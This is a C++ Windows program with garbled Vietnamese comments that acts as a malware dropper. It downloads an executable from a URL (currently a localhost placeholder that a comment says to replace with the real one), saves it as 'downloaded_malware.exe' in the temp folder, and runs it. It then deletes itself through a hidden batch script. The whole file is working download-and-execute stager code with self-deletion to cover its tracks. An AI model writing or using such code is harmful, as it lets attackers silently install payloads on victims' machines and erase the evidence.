#include <iostream>
#include <windows.h>
#include <urlmon.h> // C?n th? vi?n ?? t?i file qua URL
#include <shlobj.h> // C?n cho thao t�c ???ng d?n ??c bi?t

#pragma comment(lib, "urlmon.lib") // Li�n k?t th? vi?n URLMon
using namespace std;

void selfDelete() {
    char filePath[MAX_PATH];
    char batchPath[MAX_PATH];
    char command[MAX_PATH * 2];
    FILE* batchFile = NULL;

    // L?y ???ng d?n ??n file th?c thi hi?n t?i
    GetModuleFileNameA(NULL, filePath, MAX_PATH);

    // T?o ???ng d?n ??n file batch t?m th?i
    GetTempPathA(MAX_PATH, batchPath);
    strcat_s(batchPath, "deleteSelf.bat");

    // T?o n?i dung batch script
    snprintf(command, sizeof(command),
        "ping 127.0.0.1 > nul\n" // ??i m?t ch�t ?? ??m b?o file th?c thi ?� tho�t
        "del \"%s\"\n"
        "del %%~f0\n", // X�a batch script sau khi ho�n t?t
        filePath);

    // Ghi batch script v�o file t?m th?i b?ng fopen_s
    if (fopen_s(&batchFile, batchPath, "w") == 0) {
        fputs(command, batchFile);
        fclose(batchFile);
    }
    else {
        MessageBoxA(NULL, "Kh�ng th? t?o batch file!", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Ch?y batch script
    ShellExecuteA(NULL, "open", batchPath, NULL, NULL, SW_HIDE);
}

void executeDownloadedFile(const std::string& filePath) {
    ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOW);
    //system(filePath.c_str());
}

int main() {
    const char* downloadURL = "http://127.0.0.1:8000/calc.exe"; // Thay b?ng URL th?c t?
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath); // L?y ???ng d?n th? m?c t?m th?i

    std::string downloadedFile = std::string(tempPath) + "downloaded_malware.exe";
    //std::string downloadedFile = "downloaded_malware.exe";
    // T?i file t? URL
    HRESULT result = URLDownloadToFileA(NULL, downloadURL, downloadedFile.c_str(), 0, NULL);
    if (result == S_OK) {
        std::cout << "File downloaded to: " << downloadedFile << std::endl;

        // Th?c thi file t?i xu?ng
        executeDownloadedFile(downloadedFile);

        // T? x�a b?n th�n
        selfDelete();
    }
    else {
        std::cerr << "Failed to download file. Error code: " << std::hex << result << std::endl;
    }

    return 0;
}
